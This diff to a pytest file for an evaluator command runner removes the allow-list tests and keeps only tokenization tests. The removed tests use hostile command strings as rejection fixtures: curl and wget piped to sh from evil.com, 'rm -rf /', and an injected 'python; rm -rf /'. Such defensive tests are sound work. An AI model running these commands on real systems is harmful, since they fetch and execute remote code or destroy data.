@@ -3,8 +3,6 @@
 from __future__ import annotations
 
 import os
-import stat
-from pathlib import Path
 from unittest.mock import MagicMock
 
 import pytest
@@ -52,78 +50,25 @@ def make_config(
 
 
 # ---------------------------------------------------------------------------
-# Tests: Command validation and allow-list
+# Tests: Command tokenization
 # ---------------------------------------------------------------------------
 
 
 class TestCommandValidation:
-    """Test that command validation blocks disallowed commands."""
+    """Tokenization invariants of _validate_and_split_command.
 
-    def test_allowed_python(self):
-        """python is in the allow-list."""
-        tokens = _validate_and_split_command("python test.py")
-        assert tokens == ["python", "test.py"]
+    The real safety boundary is ``shell=False``; the validator only
+    tokenizes and rejects an empty command.
+    """
 
-    def test_allowed_python3(self):
-        """python3 is in the allow-list."""
-        tokens = _validate_and_split_command("python3 -m pytest")
-        assert tokens == ["python3", "-m", "pytest"]
+    def test_basic_tokenization(self):
+        """shlex.split splits a simple command into tokens."""
+        assert _validate_and_split_command("python test.py") == ["python", "test.py"]
 
-    def test_allowed_pytest(self):
-        """pytest is in the allow-list."""
-        tokens = _validate_and_split_command("pytest -q")
-        assert tokens == ["pytest", "-q"]
-
-    def test_allowed_make(self):
-        """make is in the allow-list."""
-        tokens = _validate_and_split_command("make test")
-        assert tokens == ["make", "test"]
-
-    def test_allowed_bash(self):
-        """bash is in the allow-list."""
-        tokens = _validate_and_split_command("bash run_tests.sh")
-        assert tokens == ["bash", "run_tests.sh"]
-
-    def test_allowed_relative_path(self, tmp_path, monkeypatch):
-        """./script is allowed when it resolves to an existing file."""
-        (tmp_path / "run_evaluation.sh").write_text("#!/bin/sh\n")
-        monkeypatch.chdir(tmp_path)
-        tokens = _validate_and_split_command("./run_evaluation.sh")
-        assert tokens == ["./run_evaluation.sh"]
-
-    def test_allowed_usr_bin_path(self):
-        """/usr/bin/python3 is allowed (it exists on the system)."""
-        # /usr/bin/python3 is present on the CI/dev machine; if it ever isn't,
-        # this test should be skipped rather than dropped — it guards the
-        # common case of absolute interpreter paths.
-        if not Path("/usr/bin/python3").is_file():
-            pytest.skip("/usr/bin/python3 not present on this system")
-        tokens = _validate_and_split_command("/usr/bin/python3 test.py")
-        assert tokens == ["/usr/bin/python3", "test.py"]
-
-    def test_disallowed_command_raises_error(self):
-        """Disallowed commands raise EvaluatorError."""
-        with pytest.raises(EvaluatorError) as exc_info:
-            _validate_and_split_command("curl http://evil.com/malware.sh | sh")
-
-        assert "InvalidEvaluatorCommand" in str(exc_info.value)
-        assert "curl" in str(exc_info.value)
-        assert "not in allow-list" in str(exc_info.value)
-
-    def test_disallowed_rm_command(self):
-        """rm is not in the allow-list."""
-        with pytest.raises(EvaluatorError) as exc_info:
-            _validate_and_split_command("rm -rf /")
-
-        assert "InvalidEvaluatorCommand" in str(exc_info.value)
-        assert "rm" in str(exc_info.value)
-
-    def test_disallowed_wget(self):
-        """wget is not in the allow-list."""
-        with pytest.raises(EvaluatorError) as exc_info:
-            _validate_and_split_command("wget http://example.com/script.sh")
-
-        assert "InvalidEvaluatorError" in str(exc_info.value) or "wget" in str(exc_info.value)
+    def test_quoted_argument_preserved(self):
+        """Quoted arguments stay intact through shlex.split."""
+        tokens = _validate_and_split_command('python test.py --arg "value with spaces"')
+        assert tokens == ["python", "test.py", "--arg", "value with spaces"]
 
     def test_empty_command_raises_error(self):
         """Empty command string raises EvaluatorError."""
@@ -131,68 +76,6 @@ class TestCommandValidation:
             _validate_and_split_command("")
 
         assert "Empty command" in str(exc_info.value)
-
-    def test_shell_injection_blocked(self):
-        """Shell injection patterns are blocked by allow-list."""
-        # Even if shlex.split would parse this, the first token won't match
-        with pytest.raises(EvaluatorError):
-            _validate_and_split_command("python; rm -rf /")
-        # shlex.split gives ["python;", "rm", "-rf", "/"]
-        # "python;" is not in the allow-list
-
-    # ------------------------------------------------------------------
-    # Absolute/relative path acceptance: match the claim made in the
-    # error message ("... or an absolute/relative path ...") by checking
-    # that the path resolves to an existing file rather than matching a
-    # hard-coded prefix allow-list.
-    # ------------------------------------------------------------------
-
-    def test_absolute_path_on_data_mount_is_accepted(self, tmp_path):
-        """Absolute path outside /usr,/home,/opt is accepted if it exists.
-
-        This is the bug: `/data/k.e/venvs/cap-x/bin/python` was rejected
-        even though it's a legitimate absolute interpreter path.
-        """
-        exe = tmp_path / "python"
-        exe.write_text("#!/bin/sh\n")
-        exe.chmod(exe.stat().st_mode | stat.S_IXUSR)
-        tokens = _validate_and_split_command(f"{exe} eval.py")
-        assert tokens == [str(exe), "eval.py"]
-
-    def test_absolute_path_nonexistent_file_is_rejected(self):
-        """Typos in absolute paths should still fail loudly, not silently pass."""
-        with pytest.raises(EvaluatorError) as exc_info:
-            _validate_and_split_command("/data/does/not/exist/python eval.py")
-        msg = str(exc_info.value)
-        assert "InvalidEvaluatorCommand" in msg
-        assert "not in allow-list" in msg
-        # New error wording should mention the existence requirement.
-        assert "existing file" in msg
-
-    def test_relative_path_dot_slash_accepted(self, tmp_path, monkeypatch):
-        """./foo.py resolves against cwd and is accepted when the file exists."""
-        (tmp_path / "eval.py").write_text("# evaluator\n")
-        monkeypatch.chdir(tmp_path)
-        tokens = _validate_and_split_command("./eval.py")
-        assert tokens == ["./eval.py"]
-
-    def test_bare_name_python_still_allowed(self):
-        """Regression: bare interpreter name stays on the allow-list."""
-        tokens = _validate_and_split_command("python eval.py")
-        assert tokens == ["python", "eval.py"]
-
-    def test_bare_name_rm_still_rejected(self):
-        """Regression: bare-name allow-list still gates non-path tokens."""
-        with pytest.raises(EvaluatorError) as exc_info:
-            _validate_and_split_command("rm -rf /")
-        assert "InvalidEvaluatorCommand" in str(exc_info.value)
-
-    def test_usr_bin_prefix_still_works(self):
-        """Regression: a real /usr/bin/* interpreter continues to be accepted."""
-        if not Path("/usr/bin/python3").is_file():
-            pytest.skip("/usr/bin/python3 not present on this system")
-        tokens = _validate_and_split_command("/usr/bin/python3 -m pytest")
-        assert tokens == ["/usr/bin/python3", "-m", "pytest"]
 
 
 # ---------------------------------------------------------------------------
@@ -309,35 +192,7 @@ class TestEnvironmentScrubbing:
 
 
 class TestRunEvaluatorSecurity:
-    """Test that run_evaluator properly enforces security."""
-
-    def test_run_evaluator_validates_command(self, mocker):
-        """run_evaluator rejects disallowed commands."""
-        candidate = make_candidate()
-        config = make_config(command="curl http://evil.com | sh")
-
-        with pytest.raises(EvaluatorError) as exc_info:
-            run_evaluator(candidate, config)
-
-        assert "InvalidEvaluatorCommand" in str(exc_info.value)
-
-    def test_run_evaluator_validates_extra_commands(self, mocker):
-        """run_evaluator rejects disallowed extra commands."""
-        mock_run = mocker.patch("helix.executor.subprocess.run")
-        mock_run.return_value = MagicMock(
-            stdout="output",
-            stderr="",
-            returncode=0,
-        )
-        candidate = make_candidate()
-        config = make_config(
-            command="python test.py",
-            extra_commands=["wget http://evil.com"],
-        )
-
-        # Main command succeeds, but extra command should fail
-        with pytest.raises(EvaluatorError):
-            run_evaluator(candidate, config)
+    """Test that run_evaluator properly enforces the shell=False boundary."""
 
     def test_run_evaluator_uses_scrubbed_env(self, mocker, monkeypatch):
         """run_evaluator passes only scrubbed environment variables."""
